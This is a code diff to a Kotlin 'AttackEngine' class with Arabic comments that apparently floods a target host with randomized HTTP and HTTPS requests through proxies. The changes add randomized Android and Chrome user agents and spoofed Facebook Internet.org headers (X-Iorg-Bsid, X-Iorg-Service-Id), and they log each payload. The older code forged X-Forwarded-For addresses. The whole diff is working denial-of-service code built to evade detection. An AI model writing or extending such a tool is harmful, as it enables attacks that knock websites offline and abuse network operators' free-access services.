@@ -7,6 +7,7 @@ import java.net.InetSocketAddress
 import java.net.Socket
 import java.security.SecureRandom
 import java.security.cert.X509Certificate
+import java.util.UUID
 import java.util.concurrent.atomic.AtomicBoolean
 import java.util.concurrent.atomic.AtomicLong
 import javax.net.ssl.SSLContext
@@ -24,6 +25,41 @@ class AttackEngine(
     private val requestCounter = AtomicLong(0)
 
     private val specialChars = "@#$%&*-_+="
+    
+    // قائمة أجهزة Android عشوائية
+    private val androidDevices = listOf(
+        "SM-G998B", "SM-G996B", "SM-G990E", "SM-F926B", "SM-F711B",
+        "SM-A525F", "SM-A325F", "SM-A125F", "SM-A225F", "SM-A725F",
+        "SM-N986B", "SM-N985F", "SM-N976B", "SM-N975F", "SM-N971N",
+        "Pixel 6", "Pixel 6 Pro", "Pixel 7", "Pixel 7 Pro", "Pixel 8",
+        "M2101K6G", "M2012K11G", "M2007J3SY", "M2102J20SG", "M2104K10AC",
+        "CPH2025", "CPH2069", "CPH2127", "CPH2173", "CPH2207"
+    )
+    
+    // قائمة إصدارات Android
+    private val androidVersions = listOf("11", "12", "13", "14", "15")
+    
+    // قائمة إصدارات Chrome
+    private val chromeVersions = listOf("133.0.6943.49", "134.0.6998.39", "134.0.6998.88", "135.0.7049.39", "135.0.7049.95")
+
+    private fun generateRandomDeviceName(): String {
+        val device = androidDevices.random()
+        val version = androidVersions.random()
+        val build = "TP1A.${Random.nextInt(100, 999)}.${Random.nextInt(10, 99)}"
+        return "$device Build/$build"
+    }
+
+    private fun generateRandomUserAgent(): String {
+        val deviceName = generateRandomDeviceName()
+        val chromeVer = chromeVersions.random()
+        val fbVer = "${Random.nextInt(450, 500)}.0.0.0.${Random.nextInt(100, 999)}"
+        
+        return "Mozilla/5.0 (Linux; Android ${androidVersions.random()}; $deviceName; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/$chromeVer Mobile Safari/537.36 [FBAN/InternetOrgApp;FBAV/$fbVer;]"
+    }
+
+    private fun generateRandomId(): String {
+        return UUID.randomUUID().toString()
+    }
 
     private fun buildBlock(size: Int): String {
         val sb = StringBuilder(size)
@@ -42,14 +78,14 @@ class AttackEngine(
         return "${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}"
     }
 
-    private fun createSecureConnect(targetHost: String, userAgent: String): String {
+    private fun createSecureConnect(targetHost: String, userAgent: String, xIorgBsid: String): String {
         return buildString {
             append("CONNECT $targetHost:443 HTTP/1.1\r\n")
             append("Host: $targetHost:443\r\n")
-            append("User-Agent: $userAgent\r\n")
             append("Proxy-Connection: keep-alive\r\n")
-            append("Connection: keep-alive\r\n")
-            append("X-Forwarded-For: ${generateRandomIp()}\r\n")
+            append("User-Agent: $userAgent\r\n")
+            append("X-Iorg-Bsid: $xIorgBsid\r\n")
+            append("X-Iorg-Service-Id: null\r\n")
             append("\r\n")
         }
     }
@@ -87,8 +123,13 @@ class AttackEngine(
         var sock: Socket? = null
         try {
             sock = createProxySocket() ?: return
-            val userAgent = AttackConfig.getRandomUserAgent()
-            val connectRequest = createSecureConnect(host, userAgent)
+            val userAgent = generateRandomUserAgent()
+            val xIorgBsid = generateRandomId()
+            val connectRequest = createSecureConnect(host, userAgent, xIorgBsid)
+            
+            // تسجيل البايلود للعرض
+            onLog("🔹 Payload Sent:\n$connectRequest")
+            
             sock.getOutputStream().write(connectRequest.toByteArray())
             sock.getOutputStream().flush()
 
@@ -96,7 +137,7 @@ class AttackEngine(
             val firstLine = reader.readLine() ?: ""
             
             if (!firstLine.contains("200")) {
-                onLog("فشل البروكسي: $firstLine")
+                onLog("❌ Proxy failed: $firstLine")
                 return
             }
 
@@ -109,8 +150,20 @@ class AttackEngine(
             val input = sslSock.getInputStream()
 
             while (running.get() && System.currentTimeMillis() - startAttack < 60000) {
+                // إنشاء بايلود جديد لكل طلب
+                val newUserAgent = generateRandomUserAgent()
+                val newXIorgBsid = generateRandomId()
+                
                 val path = "/" + buildBlock(Random.nextInt(5, 15))
-                val request = "GET $path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $userAgent\r\nConnection: keep-alive\r\n\r\n"
+                val request = buildString {
+                    append("GET $path HTTP/1.1\r\n")
+                    append("Host: $host\r\n")
+                    append("User-Agent: $newUserAgent\r\n")
+                    append("X-Iorg-Bsid: $newXIorgBsid\r\n")
+                    append("X-Iorg-Service-Id: null\r\n")
+                    append("Connection: keep-alive\r\n")
+                    append("\r\n")
+                }
                 
                 out.write(request.toByteArray())
                 out.flush()
@@ -118,19 +171,21 @@ class AttackEngine(
                 val count = requestCounter.incrementAndGet()
                 onRequestSent(count)
 
-                // قراءة جزء من الاستجابة لعرضها
+                // قراءة جزء من الاستجابة
                 val buffer = ByteArray(1024)
                 val read = input.read(buffer)
                 if (read != -1) {
                     val resp = String(buffer, 0, if (read > 100) 100 else read).replace("\r\n", " ")
-                    onLog("استجابة [$count]: ${resp.take(60)}...")
+                    onLog("📱 Response [$count]: ${resp.take(60)}...")
+                    onLog("   Device: ${newUserAgent.substringAfter("Android ").substringBefore(";")}")
+                    onLog("   BSID: $newXIorgBsid")
                 }
 
-                Thread.sleep(Random.nextLong(50, 200)) // تقليل الاستهلاك
+                Thread.sleep(Random.nextLong(50, 200))
             }
             sslSock.close()
         } catch (e: Exception) {
-            onLog("خطأ HTTPS: ${e.message}")
+            onLog("❌ HTTPS Error: ${e.message}")
         } finally {
             try { sock?.close() } catch (e: Exception) {}
         }
@@ -140,14 +195,29 @@ class AttackEngine(
         var sock: Socket? = null
         try {
             sock = createProxySocket() ?: return
-            val userAgent = AttackConfig.getRandomUserAgent()
+            
             val startAttack = System.currentTimeMillis()
             val out = sock.getOutputStream()
             val input = sock.getInputStream()
 
             while (running.get() && System.currentTimeMillis() - startAttack < 60000) {
+                // إنشاء قيم جديدة لكل طلب
+                val userAgent = generateRandomUserAgent()
+                val xIorgBsid = generateRandomId()
+                
                 val path = "/" + buildBlock(Random.nextInt(5, 15))
-                val request = "GET http://$host$path HTTP/1.1\r\nHost: $host\r\nUser-Agent: $userAgent\r\nProxy-Connection: keep-alive\r\n\r\n"
+                val request = buildString {
+                    append("GET http://$host$path HTTP/1.1\r\n")
+                    append("Host: $host\r\n")
+                    append("User-Agent: $userAgent\r\n")
+                    append("X-Iorg-Bsid: $xIorgBsid\r\n")
+                    append("X-Iorg-Service-Id: null\r\n")
+                    append("Proxy-Connection: keep-alive\r\n")
+                    append("\r\n")
+                }
+                
+                // تسجيل البايلود
+                onLog("🔹 HTTP Request:\n$request")
                 
                 out.write(request.toByteArray())
                 out.flush()
@@ -159,13 +229,13 @@ class AttackEngine(
                 val read = input.read(buffer)
                 if (read != -1) {
                     val resp = String(buffer, 0, if (read > 100) 100 else read).replace("\r\n", " ")
-                    onLog("استجابة [$count]: ${resp.take(60)}...")
+                    onLog("📱 Response [$count]: ${resp.take(60)}...")
                 }
 
                 Thread.sleep(Random.nextLong(50, 200))
             }
         } catch (e: Exception) {
-            onLog("خطأ HTTP: ${e.message}")
+            onLog("❌ HTTP Error: ${e.message}")
         } finally {
             try { sock?.close() } catch (e: Exception) {}
         }
